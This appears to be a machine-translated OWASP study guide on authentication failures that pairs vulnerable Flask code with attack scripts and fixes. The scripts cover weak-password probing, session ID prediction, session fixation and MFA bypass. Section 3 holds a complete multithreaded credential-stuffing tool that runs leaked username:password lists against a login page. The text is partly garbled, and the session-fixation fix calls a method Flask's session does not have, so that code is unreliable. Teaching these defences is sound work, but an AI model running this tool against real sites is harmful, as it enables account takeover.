# OWASP Top 10 2025 - A07: Identification and Authentication Failures Complete Guide

## StudyObjective
Master the core principles, attack techniques, and defense methods of identification and authentication failures

---

## 1. Authentication Failures Overview

### 1.1 What are Authentication Failures?
Authentication failures occur when an application fails to properly identify and verify user identities, leading to:
- Unauthorized access
- Account takeover
- Password cracking
- Session hijacking
- Identity impersonation

### 1.2 Common Types
1. **Weak Password Policies**
   - Allow simple passwords
   - No password complexity requirements
   - No password length limits

2. **Credential Stuffing Attacks**
   - Usingleakagepassword login
   - Batch account attempts

3. **Session Management Failures**
   - Predictable session IDs
   - Session fixation attacks
   - Session expiration time too long

4. **Multi-Factor Authentication Bypass**
   - MFA implementation flaws
   - Backup authentication bypass

---

## 2. Weak Password Attacks

### 2.1 Password Policy Bypass
**Vulnerable Code**:
```python
# Insecure password policy
@app.route('/register', methods=['POST'])
def register():
    username = request.form['username']
    password = request.form['password']
    
    # Only check password length
    if len(password) < 6:
        return "Password too short"
    
    # Create user
    user = User(username=username, password=password)
    db.add(user)
    db.commit()
    
    return "Registration successful"
```

**Attack Methods**:
```python
# Use weak passwords
import requests

weak_passwords = [
    "123456",
    "password",
    "admin",
    "qwerty",
    "letmein",
]

for pwd in weak_passwords:
    r = requests.post("http://target.com/register", 
                     data={"username": "test", "password": pwd})
    
    if r.status_code == 200:
        print(f"[+] Weak password accepted: {pwd}")
```

**Fix**
```python
# Secure password policy
import re
from werkzeug.security import generate_password_hash

def is_strong_password(password):
    """Check password strength"""
    if len(password) < 12:
        return False, "Password must be at least 12 characters"
    
    if not re.search(r"[A-Z]", password):
        return False, "Password must contain uppercase letter"
    
    if not re.search(r"[a-z]", password):
        return False, "Password must contain lowercase letter"
    
    if not re.search(r"\d", password):
        return False, "Password must contain digit"
    
    if not re.search(r"[!@#$%^&*(),.?\":{}|<>]", password):
        return False, "Password must contain special character"
    
    # Check common passwords
    common_passwords = ['123456', 'password', 'admin']
    if password.lower() in common_passwords:
        return False, "Password is too common"
    
    return True, "Password is strong"

@app.route('/register', methods=['POST'])
def register():
    username = request.form['username']
    password = request.form['password']
    
    # Verify password strength
    is_strong, message = is_strong_password(password)
    if not is_strong:
        return message, 400
    
    # Hash password
    hashed = generate_password_hash(password)
    
    # Create user
    user = User(username=username, password=hashed)
    db.add(user)
    db.commit()
    
    return "Registration successful"
```

---

## 3. Credential Stuffing Attacks

### 3.1 Attack Principle
Usingleakage's username and password combinations，Attempt loginObjectivewebsite。

**Automated Tool**:
```python
#!/usr/bin/env python3
"""
Credential Stuffing Attack Tool
UsingleakagecredentialsAttempt login
"""

import requests
from concurrent.futures import ThreadPoolExecutor
import time

class CredentialStuffingAttack:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.successful_logins = []
    
    def load_credentials(self, filename):
        """Loadedleakagecredentials"""
        credentials = []
        
        with open(filename, 'r') as f:
            for line in f:
                if ':' in line:
                    username, password = line.strip().split(':', 1)
                    credentials.append((username, password))
        
        return credentials
    
    def attempt_login(self, username, password):
        """Attempt login"""
        try:
            data = {
                'username': username,
                'password': password,
                'submit': 'Login'
            }
            
            r = self.session.post(self.target_url, data=data, timeout=10)
            
            # Check if login was successful
            if 'dashboard' in r.text or 'welcome' in r.text.lower():
                self.successful_logins.append({
                    'username': username,
                    'password': password
                })
                print(f"[+] Success: {username}:{password}")
                return True
        
        except Exception as e:
            pass
        
        return False
    
    def attack(self, credentials_file, threads=10):
        """Execute credential stuffing attack"""
        credentials = self.load_credentials(credentials_file)
        
        print(f"[*] Loaded {len(credentials)} credentials")
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(self.attempt_login, username, password)
                      for username, password in credentials]
        
        return self.successful_logins

# Usingexamples
if __name__ == "__main__":
    attacker = CredentialStuffingAttack("http://target.com/login")
    successful = attacker.attack("leaked_credentials.txt")
    
    print(f"\n[+] Successlogin {len(successful)} accounts")
```

---

## 4. Session Management Attacks

### 4.1 Predictable Session IDs
**Vulnerable Code**:
```python
# Insecure session ID generation
import time

def generate_session_id(user_id):
    """Generate session ID"""
    # Use user ID and timestamp
    return f"{user_id}_{int(time.time())}"

# Attacker can predict other users' session IDs
```

**Attack Methods**:
```python
# Predict session ID
def predict_session_id(user_id):
    """Predict user session ID"""
    current_time = int(time.time())
    
    # Try session IDs from the last 60 seconds
    for i in range(60):
        predicted_id = f"{user_id}_{current_time - i}"
        
        # Test predicted session ID
        r = requests.get("http://target.com/profile", 
                        cookies={'session': predicted_id})
        
        if r.status_code == 200:
            print(f"[+] session ID guessingSuccess: {predicted_id}")
            return predicted_id
    
    return None
```

**Fix**
```python
# Secure session ID generation
import secrets
import hashlib

def generate_session_id(user_id):
    """Generate secure session ID"""
    # Use cryptographically secure random numbers
    random_bytes = secrets.token_bytes(32)
    
    # Hash user ID and random bytes
    data = f"{user_id}:{random_bytes.hex()}"
    session_id = hashlib.sha256(data.encode()).hexdigest()
    
    return session_id
```

---

### 4.2 Session Fixation Attacks
**Vulnerability Scenario**: Same session ID used before and after login

**Attack Steps**:
```python
# 1. Attacker obtains session ID
session_id = "attacker_controlled_session_id"

# 2. Trick victim into logging in with that session ID
login_url = f"http://target.com/login?session={session_id}"

# 3. After victim logs in, attacker uses the same session ID
requests.get("http://target.com/profile", 
            cookies={'session': session_id})
```

**Fix**
```python
# Secure session management
from flask import session

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    # Verify credentials
    if verify_credentials(username, password):
        # loginSuccessthen regenerateGenerate session ID
        session.regenerate()
        
        # Set session attributes
        session['user_id'] = user.id
        session['login_time'] = time.time()
        
        return "Login successful"
    
    return "Invalid credentials"
```

---

## 5. Multi-Factor Authentication Bypass

### 5.1 MFA Implementation Flaws
**Vulnerable Code**:
```python
# Insecure MFA implementation
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    # Verify password
    if verify_password(username, password):
        # Set session directly, skip MFA
        session['authenticated'] = True
        return "Login successful"
    
    return "Invalid credentials"

@app.route('/verify-mfa', methods=['POST'])
def verify_mfa():
    code = request.form['code']
    
    # MFA verification (but already logged in)
    if verify_totp(session['user_id'], code):
        return "MFA verified"
    
    return "Invalid code"
```

**Attack Methods**:
```python
# Bypass MFA
# 1. Login (get session directly after password verification)
requests.post("http://target.com/login", 
             data={"username": "admin", "password": "password"})

# 2. Access protected resources (MFA not enforced)
requests.get("http://target.com/admin/dashboard")
```

**Fix**
```python
# Secure MFA implementation
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    # Verify password
    if verify_password(username, password):
        # Mark as partially authenticated
        session['partial_auth'] = True
        session['user_id'] = get_user_id(username)
        
        # Redirect to MFA page
        return redirect('/mfa')
    
    return "Invalid credentials"

@app.route('/verify-mfa', methods=['POST'])
def verify_mfa():
    code = request.form['code']
    
    # Check if password has been verified
    if not session.get('partial_auth'):
        return "Unauthorized", 401
    
    # verification MFA code
    if verify_totp(session['user_id'], code):
        # Fully authenticated
        session['authenticated'] = True
        session.pop('partial_auth', None)
        
        return "MFA verified"
    
    return "Invalid code"

# Access control decorator
def mfa_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('authenticated'):
            return "MFA required", 403
        return f(*args, **kwargs)
    return decorated_function

@app.route('/admin/dashboard')
@mfa_required
def admin_dashboard():
    return "Admin dashboard"
```

---

## 6. Automated Detection Tool

```python
#!/usr/bin/env python3
"""
Authentication Failures Automated Detection Tool
Detect authentication-related vulnerabilities
"""

import requests
import time
from concurrent.futures import ThreadPoolExecutor

class AuthenticationScanner:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.vulnerabilities = []
    
    def scan_all(self):
        """Run all scans"""
        print("\n" + "="*60)
        print("Starting Authentication Failures comprehensive scan")
        print("="*60)
        
        # 1. Weak password policy detection
        print("\n[1] Weak password policy detection...")
        self.scan_weak_passwords()
        
        # 2. Session management detection
        print("\n[2] Session management detection...")
        self.scan_session_management()
        
        # 3. MFA bypass detection
        print("\n[3] MFA bypass detection...")
        self.scan_mfa_bypass()
        
        # Generate report
        self.generate_report()
        
        return self.vulnerabilities
    
    def scan_weak_passwords(self):
        """Scan weak password policies"""
        weak_passwords = [
            '123456',
            'password',
            'admin',
            'qwerty',
        ]
        
        for pwd in weak_passwords:
            r = self.session.post(f"{self.base_url}/register",
                                 data={"username": "test", "password": pwd})
            
            if r.status_code == 200:
                self.vulnerabilities.append({
                    'type': 'Weak Password Policy',
                    'password': pwd,
                    'severity': 'High'
                })
                print(f"    [+] Weak password accepted: {pwd}")
    
    def scan_session_management(self):
        """Scan session management issues"""
        # Login to get session
        r = self.session.post(f"{self.base_url}/login",
                             data={"username": "admin", "password": "admin"})
        
        # Check session ID
        session_cookie = self.session.cookies.get('session')
        
        if session_cookie:
            # Check session ID length
            if len(session_cookie) < 16:
                self.vulnerabilities.append({
                    'type': 'Weak Session ID',
                    'session_id': session_cookie,
                    'length': len(session_cookie),
                    'severity': 'High'
                })
                print(f"    [+] Weak session ID: {session_cookie}")
    
    def scan_mfa_bypass(self):
        """Scan MFA bypass"""
        # Try to directly access protected resources
        r = self.session.get(f"{self.base_url}/admin/dashboard")
        
        if r.status_code == 200:
            self.vulnerabilities.append({
                'type': 'MFA Bypass',
                'url': f"{self.base_url}/admin/dashboard",
                'severity': 'Critical'
            })
            print(f"    [+] MFA can be bypassed")
    
    def generate_report(self):
        """Generate scan report"""
        print("\n" + "="*60)
        print(f"Scan complete - discovery {len(self.vulnerabilities)} issues found")
        print("="*60)

# Usingexamples
if __name__ == "__main__":
    scanner = AuthenticationScanner("http://target.com")
    scanner.scan_all()
```

---

## 7. Learning Checklist

### Theory Mastery
- [x] Understand authentication failure types
- [x] Master weak password attacks
- [x] Master credential stuffing
- [x] Master session management attacks
- [x] Master MFA bypass

### Practical Skills
- [x] Password policy testing
- [x] Credential stuffing attacks
- [x] Session hijacking exploitation
- [x] MFA bypass attacks
- [x] Automated detection

### defense capability
- [x] Strong password policy implementation
- [x] Secure session management
- [x] Correct MFA implementation
- [x] Credential stuffing protection

---

**Documentsversion**: 1.0
**Created**: 2026-03-26 19:03
**Estimated Study Time**: 5-6 hours
**Status**: Completed
